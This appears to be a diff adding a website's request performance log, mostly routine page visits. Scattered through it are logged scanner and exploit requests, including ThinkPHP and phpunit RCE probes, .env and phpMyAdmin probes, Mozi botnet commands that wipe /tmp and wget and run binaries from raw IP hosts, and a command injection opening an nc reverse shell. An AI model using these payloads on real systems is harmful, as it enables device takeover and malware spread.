+2021-04-12 06:36:10,712 teafound.performance 19 INFO     0.0024809837341308594 /index {}
+2021-04-12 06:36:11,956 teafound.performance 19 INFO     0.0025742053985595703 /about/ {}
+2021-04-12 06:36:13,582 teafound.performance 19 INFO     0.002526998519897461 /index {}
+2021-04-12 06:36:14,859 teafound.performance 19 INFO     0.0026366710662841797 /about/ {}
+2021-04-12 06:36:16,673 teafound.performance 19 INFO     0.002466917037963867 /index {}
+2021-04-12 08:09:48,121 teafound.performance 19 INFO     0.003503561019897461 /_ignition/execute-solution {}
+2021-04-12 08:52:32,390 teafound.performance 19 INFO     0.003528594970703125 /solr/admin/info/system {'wt=json': ''}
+2021-04-12 09:08:48,417 teafound.performance 19 INFO     0.003371000289916992 /console/ {}
+2021-04-12 09:20:09,648 teafound.performance 19 INFO     0.003466367721557617 /phpmyadmin/index.php {}
+2021-04-12 09:20:09,755 teafound.performance 19 INFO     0.022125720977783203 /pmd/index.php {}
+2021-04-12 09:20:09,793 teafound.performance 19 INFO     0.003482818603515625 /pmd/index.php {}
+2021-04-12 09:54:31,673 teafound.performance 19 INFO     0.002456188201904297 / {}
+2021-04-12 10:08:30,616 teafound.performance 19 INFO     0.002423524856567383 / {}
+2021-04-12 10:17:48,595 teafound.performance 19 INFO     0.003712177276611328 /PMA2021/index.php {'lang': 'en'}
+2021-04-12 10:17:49,499 teafound.performance 19 INFO     0.0042095184326171875 /phpMyAdmin4/index.php {'lang': 'en'}
+2021-04-12 10:17:50,280 teafound.performance 19 INFO     0.0035719871520996094 /phpMyAdmin4/index.php {'lang': 'en', 'pma_username': 'root', 'pma_password': 'master'}
+2021-04-12 10:18:28,092 teafound.performance 19 INFO     0.0035262107849121094 /hudson {}
+2021-04-12 10:40:31,370 teafound.performance 19 INFO     0.029300928115844727 /echo.php {'info': '1234567890'}
+2021-04-12 11:58:03,022 teafound.performance 19 INFO     0.0024824142456054688 / {}
+2021-04-12 12:40:04,240 teafound.performance 19 INFO     0.0024268627166748047 / {}
+2021-04-12 13:31:40,443 teafound.performance 19 INFO     0.0035386085510253906 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {}
+2021-04-12 13:31:40,447 teafound.performance 19 INFO     0.0034754276275634766 /api/jsonws/invoke {}
+2021-04-12 13:31:40,925 teafound.performance 19 INFO     0.003522157669067383 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {}
+2021-04-12 13:31:41,004 teafound.performance 19 INFO     0.021117448806762695 /solr/admin/info/system {'wt': 'json'}
+2021-04-12 13:31:41,417 teafound.performance 19 INFO     0.0036618709564208984 /index.php {'s': '/Index/\\think\\app/invokefunction', 'function': 'call_user_func_array', 'vars[0]': 'md5', 'vars[1][]': 'HelloThinkPHP21'}
+2021-04-12 13:31:41,908 teafound.performance 19 INFO     0.0025606155395507812 / {'a': 'fetch', 'content': '<php>die(@md5(HelloThinkCMF))</php>'}
+2021-04-12 13:31:41,972 teafound.performance 19 INFO     0.002427339553833008 / {'XDEBUG_SESSION_START': 'phpstorm'}
+2021-04-12 13:31:42,395 teafound.performance 19 INFO     0.0035398006439208984 /wp-content/plugins/wp-file-manager/readme.txt {}
+2021-04-12 13:31:42,441 teafound.performance 19 INFO     0.0033767223358154297 /console/ {}
+2021-04-12 13:31:43,151 teafound.performance 19 INFO     0.003536224365234375 /Autodiscover/Autodiscover.xml {}
+2021-04-12 13:31:43,187 teafound.performance 19 INFO     0.0034694671630859375 /_ignition/execute-solution {}
+2021-04-12 13:36:34,058 teafound.performance 19 INFO     0.0026330947875976562 / {}
+2021-04-12 14:08:08,057 teafound.performance 19 INFO     0.0024733543395996094 / {}
+2021-04-12 14:17:33,904 teafound.performance 19 INFO     0.0024445056915283203 / {}
+2021-04-12 14:19:39,885 teafound.performance 19 INFO     0.0024755001068115234 / {}
+2021-04-12 14:45:20,721 teafound.performance 19 INFO     0.00373077392578125 /index.htm {}
+2021-04-12 14:59:48,144 teafound.performance 19 INFO     0.003568410873413086 /goform/SystemCommand {}
+2021-04-12 14:59:51,107 teafound.performance 19 INFO     0.029146671295166016 / {}
+2021-04-12 14:59:53,637 teafound.performance 19 INFO     0.027832746505737305 / {}
+2021-04-12 15:12:17,943 teafound.performance 19 INFO     0.0024385452270507812 / {}
+2021-04-12 16:07:59,280 teafound.performance 19 INFO     0.002433300018310547 / {}
+2021-04-12 16:50:03,752 teafound.performance 19 INFO     0.003500699996948242 /_ignition/execute-solution {}
+2021-04-12 16:50:05,715 teafound.performance 19 INFO     0.0035223960876464844 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {}
+2021-04-12 16:50:06,590 teafound.performance 19 INFO     0.002431154251098633 / {}
+2021-04-12 16:50:07,481 teafound.performance 19 INFO     0.003561735153198242 /login {}
+2021-04-12 16:50:07,934 teafound.performance 19 INFO     0.003590822219848633 /jenkins/login {}
+2021-04-12 16:50:08,814 teafound.performance 19 INFO     0.003598451614379883 /manager/html {}
+2021-04-12 16:50:09,668 teafound.performance 19 INFO     0.00373077392578125 /wp-login.php {}
+2021-04-12 16:50:10,522 teafound.performance 19 INFO     0.0025136470794677734 / {'s': '/Index/\\think\\app/invokefunction', 'function': 'call_user_func_array', 'vars[0]': 'md5', 'vars[1][]': '__HelloThinkPHP'}
+2021-04-12 18:13:18,649 teafound.performance 19 INFO     0.0034525394439697266 /.env {}
+2021-04-12 18:13:19,187 teafound.performance 19 INFO     0.0034949779510498047 /.env {}
+2021-04-12 21:07:53,249 teafound.performance 19 INFO     0.002477884292602539 / {}
+2021-04-12 21:07:53,601 teafound.performance 19 INFO     0.0025482177734375 / {}
+2021-04-12 21:07:54,636 teafound.performance 19 INFO     0.0038208961486816406 /navigation.html {}
+2021-04-12 21:07:54,833 teafound.performance 19 INFO     0.0025577545166015625 / {}
+2021-04-12 21:07:55,006 teafound.performance 19 INFO     0.0036950111389160156 /cgi-bin/luci/;stok=/locale {'form': 'lang'}
+2021-04-12 21:07:55,173 teafound.performance 19 INFO     0.0029108524322509766 / {}
+2021-04-12 21:07:55,297 teafound.performance 19 INFO     0.0026013851165771484 / {}
+2021-04-12 21:07:55,320 teafound.performance 19 INFO     0.0035314559936523438 /fx_plcinf.html {'CMD': 'Monitor Start', 'LANG': 'EN'}
+2021-04-12 21:07:55,898 teafound.performance 19 INFO     0.003543853759765625 /ifixwebspace/ {}
+2021-04-12 21:07:56,086 teafound.performance 19 INFO     0.004311084747314453 /KingViewWeb/ {}
+2021-04-12 21:07:56,648 teafound.performance 19 INFO     0.0036191940307617188 /webconfig.ini {}
+2021-04-12 22:32:09,405 teafound.performance 19 INFO     0.0024881362915039062 / {}
+2021-04-12 22:48:39,088 teafound.performance 19 INFO     0.0025453567504882812 / {}
+2021-04-12 22:55:51,961 teafound.performance 19 INFO     0.0035588741302490234 /setup.cgi {'next_file': 'netgear.cfg', 'todo': 'syscmd', 'cmd': 'rm -rf /tmp/*', 'wget http://178.175.22.140:59678/Mozi.m -O /tmp/netgear': '', 'sh netgear': '', 'curpath': '/', 'currentsetting.htm': '1'}
+2021-04-13 00:28:03,391 teafound.performance 19 INFO     0.0037152767181396484 /PictureCatch.cgi {'username': 'GEOVISION\\', 'password': ';mkfifo /tmp/s0;nc -w 5 45.148.10.50 31331</tmp/s0|/bin/sh>/tmp/s0 2>/tmp/s0;rm /tmp/s0;\\', 'data_type': '1\\', 'attachment': '1\\', 'channel': '1\\', 'secret': '1\\', 'key': 'PWNED'}
+2021-04-13 00:30:16,031 teafound.performance 19 INFO     0.002487659454345703 /index {}
+2021-04-13 00:30:16,138 teafound.performance 19 INFO     0.0034182071685791016 /favicon.ico {}
+2021-04-13 00:33:30,726 teafound.performance 19 INFO     0.0024237632751464844 / {}
+2021-04-13 00:44:35,850 teafound.performance 19 INFO     0.003464937210083008 /.env {}
+2021-04-13 01:12:49,848 teafound.performance 19 INFO     0.008434057235717773 /tables/7/ {}
+2021-04-13 01:22:07,811 teafound.performance 19 INFO     0.0035552978515625 /config/getuser {'index': '0'}
+2021-04-13 02:23:02,292 teafound.performance 19 INFO     0.003942012786865234 / {}
+2021-04-13 02:28:17,191 teafound.performance 19 INFO     0.0024309158325195312 / {}
+2021-04-13 03:07:34,480 teafound.performance 19 INFO     0.002784252166748047 / {}
+2021-04-13 03:41:11,721 teafound.performance 19 INFO     0.004410266876220703 /shell {'cd /tmp': '', 'rm -rf *': '', 'wget http://45.229.54.229:44690/Mozi.a': '', 'chmod 777 Mozi.a': '', '/tmp/Mozi.a jaws': ''}
+2021-04-13 03:41:58,229 teafound.performance 19 INFO     0.0024633407592773438 / {}
+2021-04-13 04:11:21,129 teafound.performance 19 INFO     0.03721189498901367 / {}
+2021-04-13 04:18:27,093 teafound.performance 19 INFO     0.003475189208984375 /config/getuser {'index': '0'}
+2021-04-13 04:21:51,718 teafound.performance 19 INFO     0.0024509429931640625 / {}
+2021-04-13 04:52:02,591 teafound.performance 19 INFO     0.0037364959716796875 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {}
+2021-04-13 04:52:02,595 teafound.performance 19 INFO     0.003446340560913086 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {}
+2021-04-13 04:52:03,072 teafound.performance 19 INFO     0.0035669803619384766 /solr/admin/info/system {'wt': 'json'}
+2021-04-13 04:52:03,234 teafound.performance 19 INFO     0.04892992973327637 /index.php {'s': '/Index/\\think\\app/invokefunction', 'function': 'call_user_func_array', 'vars[0]': 'md5', 'vars[1][]': 'HelloThinkPHP21'}
+2021-04-13 04:52:03,559 teafound.performance 19 INFO     0.003397703170776367 /console/ {}
+2021-04-13 04:52:03,710 teafound.performance 19 INFO     0.0035440921783447266 /Autodiscover/Autodiscover.xml {}
+2021-04-13 04:52:04,190 teafound.performance 19 INFO     0.0043833255767822266 /_ignition/execute-solution {}
+2021-04-13 04:52:04,673 teafound.performance 19 INFO     0.003556489944458008 /api/jsonws/invoke {}
+2021-04-13 04:52:05,050 teafound.performance 19 INFO     0.0024361610412597656 / {'XDEBUG_SESSION_START': 'phpstorm'}
+2021-04-13 04:52:05,155 teafound.performance 19 INFO     0.0024323463439941406 / {'a': 'fetch', 'content': '<php>die(@md5(HelloThinkCMF))</php>'}
+2021-04-13 04:52:05,528 teafound.performance 19 INFO     0.003512144088745117 /wp-content/plugins/wp-file-manager/readme.txt {}
+2021-04-13 06:17:37,026 teafound.performance 19 INFO     0.0024352073669433594 / {}
+2021-04-13 08:27:56,497 teafound.performance 19 INFO     0.002415180206298828 / {}
+2021-04-13 09:32:49,494 teafound.performance 19 INFO     0.027561187744140625 /echo.php {'info': '1234567890'}
+2021-04-13 09:43:07,591 teafound.performance 19 INFO     0.0035982131958007812 /boaform/admin/formLogin {}
+2021-04-13 09:53:03,637 teafound.performance 19 INFO     0.0024302005767822266 / {}
+2021-04-13 10:52:18,503 teafound.performance 19 INFO     0.0034313201904296875 / {}
+2021-04-13 10:58:56,429 teafound.performance 19 INFO     0.0024285316467285156 / {}
+2021-04-13 10:58:56,553 teafound.performance 19 INFO     0.061272621154785156 / {}
+2021-04-13 11:00:27,815 teafound.performance 19 INFO     0.0024530887603759766 / {}
+2021-04-13 11:18:28,147 teafound.performance 19 INFO     0.002431631088256836 / {}
+2021-04-13 11:44:21,208 teafound.performance 19 INFO     0.0029833316802978516 / {}
+2021-04-13 12:02:03,506 teafound.performance 19 INFO     0.0024688243865966797 / {}
+2021-04-13 12:08:18,861 teafound.performance 19 INFO     0.002414226531982422 / {}
+2021-04-13 12:29:38,918 teafound.performance 19 INFO     0.002425670623779297 / {}
+2021-04-13 12:59:16,282 teafound.performance 19 INFO     0.00353240966796875 /ReportServer {}
+2021-04-13 13:23:15,863 teafound.performance 19 INFO     0.0024602413177490234 / {}
+2021-04-13 13:34:59,648 teafound.performance 19 INFO     0.0037479400634765625 /index.php {}
+2021-04-13 13:35:00,158 teafound.performance 19 INFO     0.003522634506225586 /phpmyadmin/index.php {}
+2021-04-13 13:46:36,064 teafound.performance 19 INFO     0.0024709701538085938 / {}
+2021-04-13 13:55:25,973 teafound.performance 19 INFO     0.0035851001739501953 /login {}
+2021-04-13 13:55:26,015 teafound.performance 19 INFO     0.0039081573486328125 /jenkins/login {}
+2021-04-13 13:56:33,117 teafound.performance 19 INFO     0.0025353431701660156 / {'s': '/Index/\\think\\app/invokefunction', 'function': 'call_user_func_array', 'vars[0]': 'md5', 'vars[1][]': '__HelloThinkPHP'}
+2021-04-13 13:59:31,345 teafound.performance 19 INFO     0.005583286285400391 /.env {}
+2021-04-13 13:59:32,120 teafound.performance 19 INFO     0.007227659225463867 / {}
+2021-04-13 14:39:47,894 teafound.performance 19 INFO     0.0026705265045166016 / {}
+2021-04-13 14:58:46,421 teafound.performance 19 INFO     0.002445697784423828 / {}
+2021-04-13 15:21:55,799 teafound.performance 19 INFO     0.0036039352416992188 /config/getuser {'index': '0'}
+2021-04-13 15:53:18,935 teafound.performance 19 INFO     0.003504514694213867 /goform/SystemCommand {}
+2021-04-13 16:13:18,945 teafound.performance 19 INFO     0.0034856796264648438 /_ignition/execute-solution {}
+2021-04-13 16:13:19,415 teafound.performance 19 INFO     0.003526926040649414 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {}
+2021-04-13 16:13:19,881 teafound.performance 19 INFO     0.0024449825286865234 / {}
+2021-04-13 16:13:21,600 teafound.performance 19 INFO     0.0035026073455810547 /login {}
+2021-04-13 16:13:21,838 teafound.performance 19 INFO     0.0035207271575927734 /jenkins/login {}
+2021-04-13 16:13:22,306 teafound.performance 19 INFO     0.003444194793701172 /manager/html {}
+2021-04-13 16:13:22,776 teafound.performance 19 INFO     0.003619670867919922 /wp-login.php {}
+2021-04-13 16:13:23,249 teafound.performance 19 INFO     0.0024924278259277344 / {'s': '/Index/\\think\\app/invokefunction', 'function': 'call_user_func_array', 'vars[0]': 'md5', 'vars[1][]': '__HelloThinkPHP'}
+2021-04-13 16:14:00,472 teafound.performance 19 INFO     0.0024755001068115234 / {}
+2021-04-13 16:51:49,565 teafound.performance 19 INFO     0.0024611949920654297 / {}
+2021-04-13 17:49:31,316 teafound.performance 19 INFO     0.0025320053100585938 / {}
+2021-04-13 18:09:35,233 teafound.performance 19 INFO     0.0024237632751464844 / {}
+2021-04-13 18:20:07,826 teafound.performance 19 INFO     0.031123638153076172 / {}
+2021-04-13 18:26:38,598 teafound.performance 19 INFO     0.0034978389739990234 /_ignition/execute-solution {}
+2021-04-13 18:26:38,680 teafound.performance 19 INFO     0.003492116928100586 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {}
+2021-04-13 18:26:38,762 teafound.performance 19 INFO     0.0026149749755859375 / {}
+2021-04-13 18:26:38,843 teafound.performance 19 INFO     0.004388570785522461 /login {}
+2021-04-13 18:26:38,885 teafound.performance 19 INFO     0.0035772323608398438 /jenkins/login {}
+2021-04-13 18:26:39,031 teafound.performance 19 INFO     0.016431093215942383 /manager/html {}
+2021-04-13 18:26:39,115 teafound.performance 19 INFO     0.0035469532012939453 /wp-login.php {}
+2021-04-13 18:26:39,190 teafound.performance 19 INFO     0.002470254898071289 / {'s': '/Index/\\think\\app/invokefunction', 'function': 'call_user_func_array', 'vars[0]': 'md5', 'vars[1][]': '__HelloThinkPHP'}
+2021-04-13 19:28:53,493 teafound.performance 19 INFO     0.0024743080139160156 / {'XDEBUG_SESSION_START=phpstorm': ''}
+2021-04-13 19:49:48,343 teafound.performance 19 INFO     0.0020394325256347656 /tables/media/images/C10H13N4O8P.png {}
+2021-04-13 19:59:02,025 teafound.performance 19 INFO     0.002468109130859375 / {}
+2021-04-13 20:01:17,748 teafound.performance 19 INFO     0.0024170875549316406 / {}
+2021-04-13 20:58:49,554 teafound.performance 19 INFO     0.002421140670776367 / {}
+2021-04-13 21:12:56,605 teafound.performance 19 INFO     0.0035452842712402344 /config/getuser {'index': '0'}
+2021-04-13 22:03:09,466 teafound.performance 19 INFO     0.0034933090209960938 /setup.cgi {'next_file': 'netgear.cfg', 'todo': 'syscmd', 'cmd': 'rm -rf /tmp/*', 'wget http://45.229.54.255:40085/Mozi.m -O /tmp/netgear': '', 'sh netgear': '', 'curpath': '/', 'currentsetting.htm': '1'}
+2021-04-13 22:27:11,707 teafound.performance 19 INFO     0.0034494400024414062 /.env {}
+2021-04-13 22:27:12,055 teafound.performance 19 INFO     0.002008199691772461 / {}
+2021-04-13 22:34:13,737 teafound.performance 19 INFO     0.0024919509887695312 / {}
+2021-04-13 23:20:53,701 teafound.performance 19 INFO     0.0025632381439208984 / {}
+2021-04-13 23:20:54,131 teafound.performance 19 INFO     0.0026886463165283203 / {}
+2021-04-13 23:30:32,212 teafound.performance 19 INFO     0.0008678436279296875 /tables/media/images/C10H13N5O4.png {}
+2021-04-13 23:56:18,771 teafound.performance 19 INFO     0.0024518966674804688 / {}
+2021-04-14 00:00:59,508 teafound.performance 19 INFO     0.0036008358001708984 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {}
+2021-04-14 00:00:59,512 teafound.performance 19 INFO     0.0034389495849609375 /api/jsonws/invoke {}
+2021-04-14 00:01:00,518 teafound.performance 19 INFO     0.0035829544067382812 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {}
+2021-04-14 00:01:00,540 teafound.performance 19 INFO     0.00392603874206543 /solr/admin/info/system {'wt': 'json'}
+2021-04-14 00:01:01,006 teafound.performance 19 INFO     0.003541231155395508 /Autodiscover/Autodiscover.xml {}
+2021-04-14 00:01:01,473 teafound.performance 19 INFO     0.003645181655883789 /wp-content/plugins/wp-file-manager/readme.txt {}
+2021-04-14 00:01:01,945 teafound.performance 19 INFO     0.003336191177368164 /console/ {}
+2021-04-14 00:01:01,998 teafound.performance 19 INFO     0.019057035446166992 / {'XDEBUG_SESSION_START': 'phpstorm'}
+2021-04-14 00:01:02,474 teafound.performance 19 INFO     0.0036187171936035156 /index.php {'s': '/Index/\\think\\app/invokefunction', 'function': 'call_user_func_array', 'vars[0]': 'md5', 'vars[1][]': 'HelloThinkPHP21'}
+2021-04-14 00:01:02,879 teafound.performance 19 INFO     0.003576517105102539 /_ignition/execute-solution {}
+2021-04-14 00:01:03,143 teafound.performance 19 INFO     0.0029535293579101562 / {'a': 'fetch', 'content': '<php>die(@md5(HelloThinkCMF))</php>'}
+2021-04-14 00:25:38,378 teafound.performance 19 INFO     0.002437591552734375 / {}
+2021-04-14 01:23:06,750 teafound.performance 19 INFO     0.003573179244995117 /config/getuser {'index': '0'}
+2021-04-14 01:54:07,715 teafound.performance 19 INFO     0.003490924835205078 /_ignition/execute-solution {}
+2021-04-14 01:54:08,229 teafound.performance 19 INFO     0.0035250186920166016 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {}
+2021-04-14 01:54:08,730 teafound.performance 19 INFO     0.0034570693969726562 /login {}
+2021-04-14 01:54:08,984 teafound.performance 19 INFO     0.003519773483276367 /jenkins/login {}
+2021-04-14 01:54:09,518 teafound.performance 19 INFO     0.0034754276275634766 /manager/html {}
+2021-04-14 01:54:10,027 teafound.performance 19 INFO     0.003517627716064453 /wp-login.php {}
+2021-04-14 01:54:10,537 teafound.performance 19 INFO     0.0025229454040527344 / {'s': '/Index/\\think\\app/invokefunction', 'function': 'call_user_func_array', 'vars[0]': 'md5', 'vars[1][]': '__HelloThinkPHP'}
+2021-04-14 01:54:11,045 teafound.performance 19 INFO     0.0024547576904296875 / {}
+2021-04-14 02:52:28,876 teafound.performance 19 INFO     0.0026397705078125 / {}
+2021-04-14 02:58:47,207 teafound.performance 19 INFO     0.0035572052001953125 /setup.cgi {'next_file': 'netgear.cfg', 'todo': 'syscmd', 'cmd': 'rm -rf /tmp/*', 'wget http://178.175.106.80:58072/Mozi.m -O /tmp/netgear': '', 'sh netgear': '', 'curpath': '/', 'currentsetting.htm': '1'}
+2021-04-14 03:28:52,988 teafound.performance 19 INFO     0.0024566650390625 / {}
+2021-04-14 03:40:38,762 teafound.performance 19 INFO     0.02700018882751465 / {}
+2021-04-14 04:28:42,983 teafound.performance 19 INFO     0.0024542808532714844 / {}
+2021-04-14 04:59:58,870 teafound.performance 19 INFO     0.0025017261505126953 / {}
+2021-04-14 05:37:58,362 teafound.performance 19 INFO     0.0024695396423339844 / {}
+2021-04-14 05:54:19,732 teafound.performance 19 INFO     0.0035288333892822266 /config/getuser {'index': '0'}
+2021-04-14 05:55:22,967 teafound.performance 19 INFO     0.0008187294006347656 /tables/media/images/C10H13N5Na3O13P3.png {}
+2021-04-14 06:47:04,559 teafound.performance 19 INFO     0.02705550193786621 / {}
+2021-04-14 07:16:23,986 teafound.performance 19 INFO     0.0024902820587158203 / {}
+2021-04-14 08:26:41,144 teafound.performance 19 INFO     0.002404928207397461 / {}
+2021-04-14 08:56:12,354 teafound.performance 19 INFO     0.002481222152709961 / {}
+2021-04-14 09:54:15,064 teafound.performance 19 INFO     0.027514934539794922 /echo.php {'info': '1234567890'}
+2021-04-14 10:00:34,061 teafound.performance 19 INFO     0.003581523895263672 /.env {}
+2021-04-14 10:00:37,576 teafound.performance 19 INFO     0.0035507678985595703 /vendor/phpunit/phpunit/phpunit.xml {}
+2021-04-14 10:58:40,444 teafound.performance 19 INFO     0.002438068389892578 / {}
+2021-04-14 11:43:27,251 teafound.performance 19 INFO     0.002439737319946289 / {}
+2021-04-14 12:27:18,826 teafound.performance 19 INFO     0.0679769515991211 / {}
+2021-04-14 12:27:21,825 teafound.performance 19 INFO     0.006764888763427734 /favicon.ico {}
+2021-04-14 12:28:36,228 teafound.performance 19 INFO     0.003392934799194336 /about/ {}
+2021-04-14 12:28:41,123 teafound.performance 19 INFO     0.04326033592224121 /search/ {'q': 'n_start=4'}
+2021-04-14 12:29:47,328 teafound.performance 19 INFO     0.002430438995361328 / {}
+2021-04-14 12:29:48,023 teafound.performance 19 INFO     0.01624155044555664 /favicon.ico {}
+2021-04-14 12:30:01,326 teafound.performance 19 INFO     0.002650022506713867 /about/ {}
+2021-04-14 12:30:04,533 teafound.performance 19 INFO     0.002453327178955078 /index {}
+2021-04-14 12:30:44,198 teafound.performance 19 INFO     0.002995729446411133 / {}
+2021-10-11 14:08:55,196 teafound.performance 19 INFO     1.2966644763946533 / {}
+2021-10-11 14:08:58,240 teafound.performance 19 INFO     0.7998909950256348 /favicon.ico {}
+2021-10-11 14:08:58,523 teafound.performance 19 INFO     0.04000687599182129 /about/ {}
+2021-10-11 14:09:02,626 teafound.performance 19 INFO     0.348844051361084 /search/ {'q': 'TMDB-00001'}
+2021-10-11 14:09:06,950 teafound.performance 19 INFO     0.0682222843170166 /search/ {'q': '123'}
+2021-10-11 14:09:09,575 teafound.performance 19 INFO     0.03238844871520996 /search/ {'q': 'TMDB-00001'}
+2021-10-11 14:09:11,636 teafound.performance 19 INFO     0.013103723526000977 /search/ {'q': ''}
+2021-10-11 14:09:16,414 teafound.performance 19 INFO     0.27767348289489746 /search/ {'q': '12'}
+2021-10-11 14:09:16,527 teafound.performance 19 INFO     0.0050029754638671875 /media//images/C10H19NO4.png {}
+2021-10-11 14:09:23,784 teafound.performance 19 INFO     0.001001596450805664 /tables/12 {}
+2021-10-11 14:09:23,847 teafound.performance 19 INFO     0.04699587821960449 /tables/12/ {}
+2021-10-11 14:09:23,943 teafound.performance 19 INFO     0.003960609436035156 /tables/media//images/C10H19NO4.png {}
+2021-10-11 14:09:28,459 teafound.performance 19 INFO     0.025002717971801758 /tables/media/ {}
+2021-10-11 14:09:41,618 teafound.performance 19 INFO     0.044719696044921875 /search/ {'q': '1232141'}
+2021-10-11 14:09:45,034 teafound.performance 19 INFO     0.029016733169555664 /search/ {'q': '12'}
+2021-10-11 14:09:47,347 teafound.performance 19 INFO     0.008022546768188477 /search/ {'sort': 'test1', 'ct': '', 'item1': ''}
+2021-10-11 14:09:50,545 teafound.performance 19 INFO     0.022059202194213867 /tables/12/ {}
+2021-10-11 14:10:11,640 teafound.performance 19 INFO     0.03279471397399902 /tables/12/ {}
+2021-10-11 14:10:41,178 teafound.performance 19 INFO     0.02681136131286621 /about/ {}
+2021-10-11 14:10:42,330 teafound.performance 19 INFO     0.01772165298461914 /index {}
+2021-10-11 14:10:44,344 teafound.performance 19 INFO     0.007538318634033203 /about/ {}
+2021-10-11 14:10:46,568 teafound.performance 19 INFO     0.007563591003417969 /index {}
+2021-10-11 14:10:47,416 teafound.performance 19 INFO     0.006913185119628906 /about/ {}
+2021-10-11 14:10:47,986 teafound.performance 19 INFO     0.007500648498535156 /index {}
+2021-10-11 14:10:48,549 teafound.performance 19 INFO     0.005017995834350586 /about/ {}
